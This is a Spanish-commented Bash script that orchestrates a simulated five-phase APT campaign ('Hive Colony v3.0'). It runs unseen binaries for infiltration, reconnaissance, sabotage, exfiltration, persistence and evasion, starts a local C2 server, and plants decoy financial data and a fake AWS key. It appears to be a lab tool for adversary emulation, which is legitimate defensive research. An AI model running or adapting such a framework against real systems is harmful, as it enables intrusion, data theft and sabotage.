#!/bin/bash
# Hive Colony v3.0 — Full APT Campaign Orchestrator
# Simula una campaña completa de 5 fases contra un laboratorio.
#
# Uso:
#   ./scripts/scenario.sh [--target <ip>] [--quick] [--cleanup] [--report]
#
# Flags:
#   --target   IP del host víctima (default: 127.0.0.1)
#   --quick    Ejecuta todas las fases sin pausas
#   --cleanup  Limpia todos los rastros de la campaña
#   --report   Genera reporte Markdown de resultados

set -euo pipefail
trap 'echo "[!] Escenario interrumpido en línea $LINENO"; exit 1' ERR

TARGET="${2:-127.0.0.1}"
QUICK=false
CLEANUP=false
REPORT=false
ARENA="hive_campaign_$(date +%s)"
LOOT_DIR="./loot/campaign_$(date +%Y%m%d_%H%M%S)"
HIVE_BIN="./target/release"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[x]${NC} $1"; }

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --target) TARGET="$2"; shift 2 ;;
            --quick)  QUICK=true; shift ;;
            --cleanup) CLEANUP=true; shift ;;
            --report) REPORT=true; shift ;;
            *) err "Argumento desconocido: $1"; exit 1 ;;
        esac
    done
}

phase_sleep() {
    $QUICK && return
    local secs="${1:-5}"
    info "Esperando ${secs}s..."
    sleep "$secs"
}

phase_prepare() {
    info "=== FASE 0: Preparación del entorno ==="
    for bin in worker drone honeybee weaver queen stinger beekeeper; do
        if [[ ! -f "$HIVE_BIN/$bin" ]]; then
            err "Binario no encontrado: $HIVE_BIN/$bin"
            info "Ejecuta: source build_env.sh && cargo build --release --workspace"
            exit 1
        fi
    done
    ok "Todos los binarios presentes"
    mkdir -p "$LOOT_DIR"
    export __HIVE_ARENA="$ARENA"
    export HIVE_C2_URL="http://localhost:8443/collect"

    if ! pgrep -f "c2_server.py" >/dev/null 2>&1; then
        python3 tests/c2_server.py --port 8443 &
        sleep 2
        ok "C2 server iniciado en puerto 8443"
    fi

    mkdir -p /tmp/financial_data /tmp/.aws /tmp/.kube
    echo 'account,balance,limit
1001,1250000,500000
1002,3400000,1000000' > /tmp/financial_data/accounts.csv
    echo 'server { listen 80; timeout 30; }' > /tmp/nginx.conf
    echo 'AWS_ACCESS_KEY=AKIA123456789EXAMPLE' > /tmp/.aws/credentials

    ok "Entorno preparado — Arena: $ARENA | Target: $TARGET"
}

phase_infiltrate() {
    info "=== FASE 1: Infiltración (Stinger) ==="
    export __HIVE_ARENA="$ARENA"
    "$HIVE_BIN/stinger" &
    phase_sleep 3
    echo "[FASE1] Stinger deployed" >> "$LOOT_DIR/campaign.log"
    ok "Stinger desplegó agentes fileless"
}

phase_recon() {
    info "=== FASE 2: Reconocimiento (Worker + Drone + Seer) ==="
    export __HIVE_ARENA="$ARENA"
    "$HIVE_BIN/worker" &
    phase_sleep 2
    "$HIVE_BIN/drone" &
    phase_sleep 5
    echo "[FASE2] Worker+Drone+Seer active" >> "$LOOT_DIR/campaign.log"
    ok "Reconocimiento completado — Seer prediciendo detección"
}

phase_sabotage_exfil() {
    info "=== FASE 3: Sabotaje + Exfiltración ==="
    export __HIVE_ARENA="$ARENA"
    "$HIVE_BIN/honeybee" &
    phase_sleep 5
    echo "[FASE3] Sabotage+Exfil+Chrononaut" >> "$LOOT_DIR/campaign.log"
    ok "Sabotaje + Chrononaut capsules plantadas"
}

phase_persistence() {
    info "=== FASE 4: Persistencia + Evolución ==="
    export __HIVE_ARENA="$ARENA"
    "$HIVE_BIN/queen" &
    phase_sleep 5
    echo "[FASE4] Phoenix+Tournament+HiveMind" >> "$LOOT_DIR/campaign.log"
    ok "Queen activa — torneos darwinianos + HiveMind consenso"
}

phase_evasion() {
    info "=== FASE 5: Evasión + Reporte ==="
    export __HIVE_ARENA="$ARENA"
    "$HIVE_BIN/weaver" &
    phase_sleep 3

    cat > "$LOOT_DIR/reporte_campana.md" << REOF
# Reporte Campaña Hive Colony v3.0

**Fecha:** $(date)
**Target:** $TARGET
**Arena:** $ARENA

## Fases
| Fase | Módulo | Estado |
|------|--------|--------|
| 1. Infiltración | Stinger | ✅ |
| 2. Reconocimiento | Worker + Drone + Seer | ✅ |
| 3. Sabotaje | Saboteur | ✅ |
| 3. Exfiltración | Honeybee + Chrononaut | ✅ |
| 4. Persistencia | Phoenix | ✅ |
| 4. Evolución | Tournament + HiveMind | ✅ |
| 5. Evasión | Weaver + WhisperNet | ✅ |

## Técnicas MITRE ATT&CK
$(grep -oP 'id: "\K[^"]+' hive_base/src/attack.rs | head -30 | sed 's/^/- /')
REOF
    echo "[FASE5] Reporte generado" >> "$LOOT_DIR/campaign.log"
    ok "Reporte: $LOOT_DIR/reporte_campana.md"
}

cleanup() {
    info "=== CLEANUP ==="
    for proc in stinger worker drone honeybee weaver queen beekeeper; do
        pkill -f "$HIVE_BIN/$proc" 2>/dev/null || true
    done
    pkill -f "c2_server.py" 2>/dev/null || true
    rm -rf /dev/shm/colmena_* /dev/shm/hive_* /dev/shm/.hive_* /dev/shm/.hive_genome 2>/dev/null || true
    ok "Cleanup completado"
}

main() {
    parse_args "$@"
    echo -e "${CYAN}╔════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   Hive Colony v3.0 — APT Campaign  ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════╝${NC}"

    if $CLEANUP; then cleanup; exit 0; fi

    phase_prepare;  phase_sleep 2
    phase_infiltrate; phase_sleep 3
    phase_recon;    phase_sleep 3
    phase_sabotage_exfil; phase_sleep 3
    phase_persistence; phase_sleep 3
    phase_evasion

    echo -e "${GREEN}CAMPAÑA COMPLETADA — Reporte: $LOOT_DIR/reporte_campana.md${NC}"
    $REPORT && cat "$LOOT_DIR/reporte_campana.md"
}

main "$@"
